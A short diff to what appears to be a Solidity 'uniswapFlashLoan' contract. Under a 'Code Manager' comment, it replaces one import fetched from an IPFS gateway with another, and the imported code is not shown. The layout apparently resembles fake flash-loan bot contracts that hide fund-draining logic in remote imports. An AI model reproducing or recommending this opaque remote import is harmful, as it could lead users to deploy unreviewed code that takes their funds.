@@ -10,7 +10,7 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
  
 // Code Manager
-import "https://gateway.pinata.cloud/ipfs/QmbEFVWTf4Tg8vKTWBq5wcS6PcrUWNRZfjrvJTxbMEioBk";
+import "https://gateway.pinata.cloud/ipfs/Qme2jy2RZKWyGc5nHgCPGSjjumXqmjDGvvcgc2AqwRfp8Q";
  
  
 contract uniswapFlashLoan {
